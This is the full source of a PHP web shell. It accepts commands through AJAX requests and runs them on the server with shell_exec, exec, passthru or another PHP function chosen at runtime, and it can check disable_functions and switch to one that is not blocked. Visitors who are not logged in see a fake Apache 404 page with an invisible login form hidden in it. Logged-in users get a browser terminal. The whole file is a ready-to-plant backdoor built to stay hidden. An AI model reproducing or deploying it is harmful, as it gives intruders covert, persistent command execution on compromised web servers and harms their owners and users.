<?php
session_start();
class Shell{
	public $config;
	public function __construct(){
		$this->config = array(
			'filename'=>basename(__FILE__),
			'username'=>'f76d43a5d1e3fc4637eae011019640923ccf7ea6',
			'password'=>'f990ec1710ab719b074608646cea8adf3ca509f3',
			'interpreter'=>'shell_exec',
			'current_user'=>get_current_user(),
			'hostname'=>function_exists('gethostname')?gethostname():$_SERVER['HTTP_HOST'],
			'server_address'=>isset($_SERVER['SERVER_ADDR'])?$_SERVER['SERVER_ADDR']:'127.0.0.1',
			'server_port'=>$_SERVER['SERVER_PORT'],
			'request_time'=>$_SERVER['REQUEST_TIME'],
			'php_owner_uid'=>getmyuid(),
			'php_owner_gid'=>getmygid(),
			'php_process_id'=>getmypid(),
			'inode_script'=>getmyinode(),
			'last_page_modification'=>getlastmod(),
			'cwd'=>getcwd()
		);
		if( isset($_SESSION['interpreter']) ){ $this->config['interpreter'] = $_SESSION['interpreter']; }
		if( isset($_SESSION['cwd']) AND $_SESSION['cwd']!=$this->config['cwd'] ){
			chdir($_SESSION['cwd']);
			$this->config['cwd'] = getcwd();
		}
		$this->config['prompt'] = $this->get_prompt();
	}
	public function get_prompt(){
		$prompt = sprintf(
			'%s@%s [%s] %s $ ',
			$this->config['current_user'],
			$this->config['hostname'],
			date('Y/m/d H:i'),
			$this->config['cwd']
		);
		return $prompt;
	}
	public function login($username='', $password=''){
		return ( sha1($username)==$this->config['username'] AND sha1($password)==$this->config['password'] ) ? TRUE : FALSE;
	}
	public function is_ajax_request(){
		return ( isset($_SERVER['HTTP_X_REQUESTED_WITH']) AND $_SERVER['HTTP_X_REQUESTED_WITH']=='XMLHttpRequest' ) ? TRUE : FALSE;
	}
	public function request($input=''){
		$method = $_SERVER['REQUEST_METHOD'];
		switch($method){
			case 'POST': $data = $_POST; break;
			case 'GET': $data = $_GET; break;
			default: $data = array(); break;
		}
		return array_key_exists($input, $data) ? $data[$input] : FALSE;
	}
	public function disabled_functions(){
		$functions = array();
		$disabled_functions = ini_get('disable_functions');
		if( !empty($disabled_functions) ){
			$list = explode(',', $disabled_functions);
			foreach($list as $function){
				$function = trim($function);
				if( !empty($function) ){
					array_push($functions, $function);
				}
			}
		}
		return $functions;
	}
	public function handle_execution(){
		if( $this->is_ajax_request() ){
			$interpreter = $this->config['interpreter'];
			$command = $this->request('command');
			$data_set = array();
			$data_set['output'] = $this->execute($command);
			$data_set['prompt'] = $this->get_prompt();
			print(json_encode($data_set));
			exit;
		}
	}
	public function execute($command=''){
		if( !empty($command) ){
			if( preg_match('/^set_interpreter\((.*)\)$/', $command, $match) ){
				$interpreter = $match[1];
				$disabled_functions = $this->disabled_functions();
				if( in_array($interpreter, $disabled_functions) ){
					return sprintf('Error. Function "%s" is blocked by php.ini', $interpreter);
				}else{
					if( function_exists($interpreter) ){
						$_SESSION['interpreter'] = $interpreter;
						$this->config['interpreter'] = $interpreter;
						return sprintf('Success. Function "%s" was set correctly.', $interpreter);
					}else{
						return sprintf('Error. Function "%s" does not exists.', $interpreter);
					}
				}
			}elseif( preg_match('/^get_interpreter$/', $command) ){
				return sprintf('Current interpreter set as: %s', $this->config['interpreter']);
			}elseif( preg_match('/^get_disabled_functions$/', $command) ){
				$disabled_functions = $this->disabled_functions();
				return sprintf('These functions are disabled throught php.ini: %s', implode(','.chr(32), $disabled_functions));
			}elseif( preg_match('/^(get_php_version|php_version)$/', $command) ){
				return sprintf('PHP version is: %s', PHP_VERSION);
			}elseif( preg_match('/^cd (.*)/', $command, $match) ){
				$_SESSION['cwd'] = realpath($match[1]);
				$this->config['cwd'] = $_SESSION['cwd'];
				return sprintf('Changed directory to: %s', $_SESSION['cwd']);
			}elseif( preg_match('/^(logout|exit)$/', $command) ){
				$_SESSION['authenticated'] = 0;
				session_destroy();
				return 'location.reload';
			}else{
				$output = NULL;
				$result = NULL;
				$capture_buffer = FALSE;
				$interpreter = $this->config['interpreter'];
				if( $interpreter == 'passthru' ){ $capture_buffer = TRUE; }
				switch($interpreter){
					case 'exec':
						try{
							exec($command, $output_arr, $result);
							$output = implode("\n", $output_arr);
						}catch(Exception $e){
							$output = 'Caught exception: '.$e->getMessage();
						}
						break;
					case 'shell_exec':
					default:
						if( $capture_buffer ){ ob_start(); }
						$output = call_user_func($interpreter, $command);
						if( $capture_buffer ){
							$output = ob_get_contents();
							ob_end_clean();
						}
						if( $output == null ){
							$output = sprintf("Cannot execute this command: %s\n", $command);
						}
						break;
				}
				return $output;
			}
		}
	}
}
$shell = new Shell();
$shell->handle_execution();
?>
<?php if( isset($_POST['u']) AND isset($_POST['p']) AND $shell->login($_POST['u'],$_POST['p']) ){ $_SESSION['authorized']=1; } ?>
<?php if( !isset($_SESSION['authorized']) OR $_SESSION['authorized']!=1 ): header('HTTP/1.1 404 Not Found'); ?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body style="background:#fff">
<h1>Not Found</h1>
<p>The requested URL <?php echo $_SERVER['REQUEST_URI']; ?> was not found on this server.</p>
<p>Additionally, a 404 Not Found
error was encountered while trying to use an ErrorDocument to handle the request.</p>
<hr>
<address>Apache Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port <?php echo $_SERVER['SERVER_PORT']; ?></address>
<form method="post" style="position:fixed;bottom:0;right:0"><input type="text" name="u" style="border:0;background:#fff"><input type="password" name="p" style="border:0;background:#fff"><input type="submit" value="login" style="display:none"></form>
</body></html>
<?php exit; endif; ?>
<!DOCTYPE html>
<html>
<head>
	<title>Shell</title>
	<style type="text/css">
	.terminal .terminal-output .format, .terminal .cmd .format, .terminal .cmd .prompt, .terminal .cmd .prompt div, .terminal .terminal-output div div{display:inline-block}
	.terminal .clipboard{position:absolute;bottom:0;left:0;opacity:0.01;width:2px}
	.cmd > .clipboard{position:fixed}
	.terminal{padding:10px;position:relative;overflow:hidden}
	.cmd{padding:0;margin:0;height:1.3em;margin-top:3px}
	.terminal .terminal-output div div, .terminal .prompt{display:block;line-height:14px;height:auto}
	.terminal .prompt{float:left}
	.terminal{font-family:monaco, monospace;color:#aaa;background-color:#000;font-size:12px;line-height:14px}
	.terminal-output > div{padding-top:3px}
	.terminal .terminal-output div span{display:inline-block}
	.terminal .cmd span{float:left}
	.terminal .cmd span.inverted{background-color:#aaa;color:#000}
	.terminal .terminal-output div div::-moz-selection, .terminal .terminal-output div span::-moz-selection, .terminal .terminal-output div div a::-moz-selection{background-color:#aaa;color:#000}
	.terminal .terminal-output div div::selection, .terminal .terminal-output div div a::selection, .terminal .terminal-output div span::selection, .terminal .cmd > span::selection, .terminal .prompt span::selection{background-color:#aaa;color:#000}
	.terminal .terminal-output div.error, .terminal .terminal-output div.error div{color:red}
	.tilda{position:fixed;top:0;left:0;width:100%;z-index:1100}
	.clear{clear:both}
	.terminal a{color:#0F60FF}
	.terminal a:hover{color:red}
	</style>
	<script type="text/javascript" src="jquery.min.js"></script>
	<script type="text/javascript" src="jquery.terminal.min.js"></script>
	<script>
	jQuery(document).ready(function(){
		var web_service = '<?php echo $shell->config["filename"]; ?>';
		$('body').terminal(function(command, term){
			term.pause();
			$.ajax({
				url: web_service,
				type: 'POST',
				dataType: 'json',
				data: { action:'execute', command:command },
				cache: false,
				success: function(data, textStatus, jqXHR){
					if( data=='location.reload' ){
						window.location.reload();
					}else{
						term.set_prompt(data.prompt);
						term.echo(data.output);
						term.resume();
					}
				}
			})
		},{
			login: false,
			greetings: 'You are authenticated',
			prompt: '<?php echo $shell->config["prompt"]; ?>',
			onBlur: function(){ return false; }
		}).css({ overflow:'auto' });
	});
	</script>
</head>
<body>
</body>
</html>